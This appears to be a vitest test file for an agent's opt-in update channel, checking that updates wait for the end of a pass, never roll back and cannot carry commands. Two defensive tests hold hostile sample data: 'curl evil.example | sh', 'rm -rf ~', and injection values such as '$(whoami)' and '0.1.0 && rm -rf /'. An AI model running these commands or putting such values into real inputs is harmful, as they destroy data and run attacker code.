/**
 * The checkpoint barrier — an update announced mid-pass is held, applied only
 * between passes, and never lands on a half-finished write.
 *
 * This is the instrument under "Would operators enable an update channel that
 * can change an unattended agent", and it is worth being precise about what it
 * can and cannot settle, because on this node that gap is most of the node.
 *
 * **What it settles.** The one falsifiable engineering claim the push-channel
 * candidate makes: that propagation can begin on the publisher's side without
 * a change ever landing in the middle of a pass. A pass is four or more separate
 * processes writing an append-only ledger and a tree of markdown files, so
 * "between passes" is not a nicety — an apply between two `loop step`s changes
 * what the second half of a pass is running from under the first half. The
 * barrier below is asserted in both directions (a pass in flight holds an
 * apply; an apply holds the lock so a pass cannot start under one) and at the
 * one instant where the two could interleave.
 *
 * **What it does not settle, and it is the deciding question.** Whether an
 * operator will accept that something off their machine can change what the
 * agent does on it. That is the threshold recorded in the test node — three
 * operators, told plainly, at least two saying yes to both questions — and no
 * test file can produce it. A green here means the mechanism is safe against
 * torn writes. It says nothing at all about whether anyone wants the mechanism.
 *
 * **The second-order property this pins, which is not in the node's wording.**
 * An announcement is data, never a command. `readAnnouncements` rebuilds every
 * spool line field by field, so a line carrying `run:` or `command:` reaches
 * nobody, and applying an update moves a version pin and does nothing else. The
 * repository's guarantee is that it holds no destructive capability; a channel
 * that could hand an announced string to a shell would be that guarantee's exact
 * negation, and a spec for this feature that did not pin it would be leaving the
 * hole open for the next person to fill.
 */
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { LOOP_EXIT } from "../../src/cli/loop.js";
import { acquireFiringLock, firingLockPath, readFiringLock } from "../../src/loop/lock.js";
import { readOpenRun, sealRun, startRun } from "../../src/loop/health.js";
import {
  announceUpdate,
  announcedPath,
  appliedPath,
  applyAtCheckpoint,
  pendingUpdate,
  readAnnouncements,
  readAppliedUpdate,
  subscriptionOf,
  updateStatusLine,
  type UpdateAnnouncement,
} from "../../src/loop/updates.js";

const TTL = 60 * 60_000;
const CHANNEL = "ost-agent";
const SUB = { channel: CHANNEL };

let vault: string;
beforeEach(() => {
  vault = fs.mkdtempSync(path.join(os.tmpdir(), "ost-checkpoint-"));
  fs.mkdirSync(path.join(vault, ".git"));
});
afterEach(() => fs.rmSync(vault, { recursive: true, force: true }));

/** Spool one announcement, defaulting the fields a test is not asserting on. */
function announce(over: Partial<UpdateAnnouncement> & { version: string }): UpdateAnnouncement {
  const r = announceUpdate(
    vault,
    { channel: CHANNEL, announcedAt: "2026-08-10T09:00:00.000Z", ...over },
    { subscription: SUB },
  );
  if (!r.ok) throw new Error(`setup: ${r.reason}`);
  return r.announcement;
}

/** Open a run the way `loop start` does, so the barrier sees a real pass. */
function openAPass(): string {
  return startRun(vault, { loopVersion: "test", cliVersion: "test" }).runId;
}

const NOW = Date.parse("2026-08-10T12:00:00.000Z");

describe("the channel is opt-in, and an unsubscribed vault cannot be pushed to at all", () => {
  test("no `loop.updates.channel` means no subscription", () => {
    expect(subscriptionOf(undefined)).toBeNull();
    expect(subscriptionOf(null)).toBeNull();
    expect(subscriptionOf({})).toBeNull();
    expect(subscriptionOf({ channel: "" })).toBeNull();
    expect(subscriptionOf({ channel: "   " })).toBeNull();
  });

  test("a malformed channel is no subscription, not a subscription with a default", () => {
    // The failure this refuses: an operator part-way through typing the key ends
    // up with a vault that accepts remote changes because something guessed.
    expect(subscriptionOf({ channel: "../elsewhere" })).toBeNull();
    expect(subscriptionOf({ channel: "two words" })).toBeNull();
    expect(subscriptionOf({ channel: "a/b" })).toBeNull();
    expect(subscriptionOf({ channel: CHANNEL })).toEqual({ channel: CHANNEL });
  });

  test("an unsubscribed vault refuses to even spool an announcement", () => {
    const r = announceUpdate(vault, { channel: CHANNEL, version: "9.9.9" }, { subscription: null });
    expect(r.ok).toBe(false);
    expect(fs.existsSync(announcedPath(vault)!)).toBe(false);
  });

  test("an unsubscribed vault applies nothing, whatever is on the spool", () => {
    announce({ version: "0.11.0" }); // spooled while subscribed…
    const outcome = applyAtCheckpoint(vault, { subscription: null, ttlMs: TTL, now: NOW });
    expect(outcome.action).toBe("unsubscribed");
    expect(fs.existsSync(appliedPath(vault)!)).toBe(false);
  });

  test("an announcement addressed to another channel is refused and, if forced onto the spool, ignored", () => {
    expect(announceUpdate(vault, { channel: "someone-else", version: "0.11.0" }, { subscription: SUB }).ok).toBe(false);
    fs.mkdirSync(path.dirname(announcedPath(vault)!), { recursive: true });
    fs.appendFileSync(
      announcedPath(vault)!,
      JSON.stringify({ channel: "someone-else", version: "6.6.6", announcedAt: "2026-08-10T09:00:00.000Z" }) + "\n",
    );
    expect(applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW }).action).toBe("none");
  });
});

describe("held while a pass is in flight — this is the claim", () => {
  test("an update announced mid-pass is held, and not one byte of the pin changes", () => {
    const runId = openAPass();
    announce({ version: "0.11.0" });

    const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(outcome.action).toBe("held");
    if (outcome.action === "held") {
      expect(outcome.reason).toContain(runId);
      expect(outcome.pending.version).toBe("0.11.0");
    }
    expect(fs.existsSync(appliedPath(vault)!)).toBe(false);
  });

  test("an update announced mid-pass never overwrites the version the pass is running on", () => {
    // The half-finished write, stated as the operator would see it: a pass that
    // started on 0.10.0 must still be on 0.10.0 at its last step.
    announce({ version: "0.10.0", announcedAt: "2026-08-09T09:00:00.000Z" });
    expect(applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW }).action).toBe("applied");
    expect(readAppliedUpdate(vault)?.version).toBe("0.10.0");

    openAPass();
    announce({ version: "0.11.0" });
    applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(readAppliedUpdate(vault)?.version).toBe("0.10.0");
  });

  test("holding loses nothing: the same announcement applies at the next checkpoint", () => {
    openAPass();
    announce({ version: "0.11.0" });
    expect(applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW }).action).toBe("held");

    sealRun(vault, {});
    expect(readOpenRun(vault)).toBeNull();

    const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(outcome.action).toBe("applied");
    expect(readAppliedUpdate(vault)?.version).toBe("0.11.0");
  });

  test("a crashed pass's unswept marker holds the update, even with the lock long since free", () => {
    // The marker outlives the process that died, and nothing holds the lock.
    // Held anyway: sweeping the marker is `loop start`'s job, and a command that
    // applies updates has no business writing the health ledger. Conservative on
    // purpose, and the way out is not a human — `loop start` sweeps and then
    // applies at its own checkpoint, which is asserted end to end below.
    openAPass();
    announce({ version: "0.11.0" });
    expect(readFiringLock(vault)).toBeNull();

    const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(outcome.action).toBe("held");
    if (outcome.action === "held") expect(outcome.reason).toMatch(/in flight/);
    expect(fs.existsSync(appliedPath(vault)!)).toBe(false);
  });
});

describe("the barrier runs in both directions, and closes its own race", () => {
  test("a firing that holds the lock holds the update, even with no run open yet", () => {
    // `loop start` takes the lock before it opens its run. In that window there
    // is no open marker and a pass is nonetheless starting; an apply that only
    // consulted the marker would land right there.
    announce({ version: "0.11.0" });
    const held = acquireFiringLock(vault, { ttlMs: TTL, holderPid: process.pid });
    expect(held.ok).toBe(true);

    const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(outcome.action).toBe("held");
    if (outcome.action === "held") expect(outcome.reason).toMatch(/holds the lock/);
    expect(fs.existsSync(appliedPath(vault)!)).toBe(false);
  });

  test("an apply releases the lock, so the next pass is not blocked by a checkpoint", () => {
    announce({ version: "0.11.0" });
    expect(applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW }).action).toBe("applied");
    expect(readFiringLock(vault)).toBeNull();
    expect(fs.existsSync(firingLockPath(vault)!)).toBe(false);
  });

  test("a caller that already holds the lock is not refused against itself", () => {
    // `loop start` applies between taking the lock and opening its run. If the
    // barrier re-acquired there it would refuse against its own lock and hold
    // every update forever — a channel that propagates nothing at all.
    announce({ version: "0.11.0" });
    const held = acquireFiringLock(vault, { ttlMs: TTL, holderPid: process.pid });
    expect(held.ok).toBe(true);
    const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW, holdsLock: true });
    expect(outcome.action).toBe("applied");
  });

  test("a run opened while the checkpoint was taking the lock still holds it", () => {
    // The second read of the open marker, which is the whole race. Simulated by
    // opening a run between the two reads — the state a `loop start` that won
    // the lock race would have left.
    announce({ version: "0.11.0" });
    openAPass(); // the racing `loop start`, already recorded on disk
    const realExists = fs.existsSync;
    let reads = 0;
    const openMarker = path.join(vault, ".git", "ost-agent", "open-run.json");
    const spy = ((p: fs.PathLike, ...rest: unknown[]) => {
      if (String(p) === openMarker && ++reads === 1) return false; // first read: no pass yet
      return (realExists as (p: fs.PathLike) => boolean).call(fs, p, ...(rest as []));
    }) as typeof fs.existsSync;
    fs.existsSync = spy;
    try {
      const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
      expect(outcome.action).toBe("held");
      if (outcome.action === "held") expect(outcome.reason).toMatch(/opened while this checkpoint was taking the lock/);
    } finally {
      fs.existsSync = realExists;
    }
    expect(fs.existsSync(appliedPath(vault)!)).toBe(false);
  });
});

describe("applied between passes, and the pin is never torn", () => {
  test("with nothing in flight the newest announcement is applied", () => {
    announce({ version: "0.11.0", source: "publisher", notes: "fixes the thing" });
    const outcome = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(outcome.action).toBe("applied");
    const pin = readAppliedUpdate(vault);
    expect(pin?.version).toBe("0.11.0");
    expect(pin?.appliedAt).toBe(new Date(NOW).toISOString());
    expect(pin?.announcedAt).toBe("2026-08-10T09:00:00.000Z");
  });

  test("applying twice is a no-op — an already-applied version is not reapplied", () => {
    announce({ version: "0.11.0" });
    applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    const again = applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW + 60_000 });
    expect(again.action).toBe("none");
    expect(readAppliedUpdate(vault)?.appliedAt).toBe(new Date(NOW).toISOString());
  });

  test("the pin on disk is a complete record the moment it exists, and leaves no temp behind", () => {
    // Same argument as the firing lock's: publish by rename, so a launcher
    // reading the pin sees the old version or the new one and never zero bytes.
    announce({ version: "0.11.0" });
    applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    expect(fs.statSync(appliedPath(vault)!).size).toBeGreaterThan(0);
    expect(JSON.parse(fs.readFileSync(appliedPath(vault)!, "utf8")).version).toBe("0.11.0");
    const strays = fs.readdirSync(path.dirname(appliedPath(vault)!)).filter((f) => f.startsWith("."));
    expect(strays).toEqual([]);
  });

  test("the spool and the pin live under .git/, where no vault commit can sweep them", () => {
    // The reason `state.ts` gives, and the reason F6 still holds with a push
    // channel in the loop: git refuses to track anything inside its own
    // directory, so `git add -A` cannot carry a decider into a commit.
    expect(announcedPath(vault)!.startsWith(path.join(vault, ".git") + path.sep)).toBe(true);
    expect(appliedPath(vault)!.startsWith(path.join(vault, ".git") + path.sep)).toBe(true);
  });
});

describe("what an announcement is allowed to be", () => {
  test("an announcement cannot carry a command, a path or a URL to run", () => {
    fs.mkdirSync(path.dirname(announcedPath(vault)!), { recursive: true });
    fs.appendFileSync(
      announcedPath(vault)!,
      JSON.stringify({
        channel: CHANNEL,
        version: "0.11.0",
        announcedAt: "2026-08-10T09:00:00.000Z",
        command: "rm -rf ~",
        run: "curl evil.example | sh",
        url: "https://evil.example/payload",
      }) + "\n",
    );
    const [read] = readAnnouncements(vault);
    expect(Object.keys(read).sort()).toEqual(["announcedAt", "channel", "version"]);

    applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    const pin = fs.readFileSync(appliedPath(vault)!, "utf8");
    expect(pin).not.toMatch(/rm -rf|curl|evil\.example/);
    expect(Object.keys(JSON.parse(pin)).sort()).toEqual(["announcedAt", "appliedAt", "channel", "version"]);
  });

  test("a version that is not a plain version is not an announcement", () => {
    for (const version of ["../../etc/passwd", "0.1.0 && rm -rf /", "$(whoami)", "", "a".repeat(65)]) {
      expect(announceUpdate(vault, { channel: CHANNEL, version }, { subscription: SUB }).ok).toBe(false);
    }
    expect(announceUpdate(vault, { channel: CHANNEL, version: "0.11.0-rc.1" }, { subscription: SUB }).ok).toBe(true);
  });

  test("a corrupt spool line is skipped and does not stop the ones around it", () => {
    announce({ version: "0.10.0", announcedAt: "2026-08-08T09:00:00.000Z" });
    fs.appendFileSync(announcedPath(vault)!, "{not json\n");
    announce({ version: "0.11.0", announcedAt: "2026-08-09T09:00:00.000Z" });
    expect(readAnnouncements(vault).map((a) => a.version)).toEqual(["0.10.0", "0.11.0"]);
  });
});

describe("which announcement wins", () => {
  const pending = (announcements: UpdateAnnouncement[], applied: Parameters<typeof pendingUpdate>[0]["applied"] = null) =>
    pendingUpdate({ announcements, applied, subscription: SUB, now: NOW });

  const ann = (version: string, announcedAt: string): UpdateAnnouncement => ({ channel: CHANNEL, version, announcedAt });

  test("the newest that could actually have happened, not the newest line", () => {
    const v = pending([ann("0.10.0", "2026-08-08T00:00:00.000Z"), ann("0.11.0", "2026-08-09T00:00:00.000Z")]);
    expect(v.pending?.version).toBe("0.11.0");
  });

  test("a future-stamped announcement is ignored, not clamped — and is reported", () => {
    // `cadence.ts`'s wedge, in a second place: one announcement stamped in 3000
    // would otherwise be "the newest" forever and make every real one a
    // downgrade, clearable only by hand-editing a file inside `.git`.
    const v = pending([ann("0.11.0", "2026-08-09T00:00:00.000Z"), ann("9.9.9", "3000-01-01T00:00:00.000Z")]);
    expect(v.pending?.version).toBe("0.11.0");
    expect(v.ignoredFuture).toBe(1);
  });

  test("a replayed older announcement never rolls this machine back", () => {
    // A subscriber reconnecting after a gap replays what it missed, and one of
    // those is older than what this machine already runs. A pin that moved
    // backwards there would be an update channel that downgrades an unattended
    // agent — the failure this candidate would be judged on.
    const applied = { ...ann("0.11.0", "2026-08-09T00:00:00.000Z"), appliedAt: "2026-08-09T01:00:00.000Z" };
    const v = pending([ann("0.9.0", "2026-08-01T00:00:00.000Z")], applied);
    expect(v.pending).toBeNull();
    expect(v.reason).toMatch(/never rolls this machine back/);
  });

  test("nothing pending once the newest announcement is the applied one", () => {
    const applied = { ...ann("0.11.0", "2026-08-09T00:00:00.000Z"), appliedAt: "2026-08-09T01:00:00.000Z" };
    expect(pending([ann("0.11.0", "2026-08-09T00:00:00.000Z")], applied).pending).toBeNull();
  });

  test("the status line says what is running AND what is waiting", () => {
    expect(updateStatusLine(vault, null, NOW)).toMatch(/takes no pushed updates/);
    announce({ version: "0.11.0" });
    expect(updateStatusLine(vault, SUB, NOW)).toMatch(/nothing applied yet.*0\.11\.0 pending/);
    applyAtCheckpoint(vault, { subscription: SUB, ttlMs: TTL, now: NOW });
    const line = updateStatusLine(vault, SUB, NOW);
    expect(line).toContain("0.11.0");
    expect(line).not.toMatch(/pending/);
  });
});

describe("through the real CLI — `loop start` is the checkpoint a cron already runs", () => {
  const TSX = path.resolve(__dirname, "../../node_modules/.bin/tsx");
  const CLI = path.resolve(__dirname, "../../src/cli/index.ts");

  let repo: string;
  const git = (...args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
  const run = (...args: string[]) => {
    const r = spawnSync(TSX, [CLI, "loop", ...args, "--vault", repo], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
    return { code: r.status ?? -1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
  };

  beforeEach(() => {
    repo = fs.mkdtempSync(path.join(os.tmpdir(), "ost-checkpoint-cli-"));
    git("init", "--quiet");
    git("config", "user.email", "t@example.com");
    git("config", "user.name", "T");
    fs.writeFileSync(
      path.join(repo, "ost.config.yaml"),
      `outcome: "ship it"\nloop:\n  cadence: "6h"\n  updates:\n    channel: "${CHANNEL}"\n`,
      "utf8",
    );
    git("add", "-A");
    git("commit", "--quiet", "-m", "init");
  });
  afterEach(() => fs.rmSync(repo, { recursive: true, force: true }));

  test("announce → start applies it before the run opens; a mid-pass announcement waits for the next start", () => {
    expect(run("announce", "--release", "0.11.0").code).toBe(0);

    const started = run("start");
    expect(started.code).toBe(0);
    expect(started.out).toMatch(/applied 0\.11\.0 at a checkpoint/);
    expect(readAppliedUpdate(repo)?.version).toBe("0.11.0");

    // Mid-pass: the run is open and the lock is held.
    const midPass = run("announce", "--release", "0.12.0");
    expect(midPass.code).toBe(0);
    expect(run("update").code).toBe(LOOP_EXIT.updateHeld);
    expect(readAppliedUpdate(repo)?.version).toBe("0.11.0");

    // Sealed, not necessarily green — this bracket ran no phases, so the verdict
    // is `unhealthy` and seal says so. What matters here is that the pass is over
    // and the update was still not applied by the act of sealing.
    run("seal");
    expect(readOpenRun(repo)).toBeNull();
    expect(readAppliedUpdate(repo)?.version).toBe("0.11.0");

    const restarted = run("start");
    expect(restarted.code).toBe(0);
    expect(readAppliedUpdate(repo)?.version).toBe("0.12.0");
  });

  test("a vault that subscribed to nothing says so and applies nothing", () => {
    fs.writeFileSync(path.join(repo, "ost.config.yaml"), `outcome: "ship it"\nloop:\n  cadence: "6h"\n`, "utf8");
    git("add", "-A");
    git("commit", "--quiet", "-m", "unsubscribe");
    const r = run("update");
    expect(r.code).toBe(LOOP_EXIT.updateUnsubscribed);
    expect(r.out).toMatch(/no update channel/);
    expect(run("announce", "--release", "0.11.0").code).toBe(LOOP_EXIT.updateUnsubscribed);
  });
});
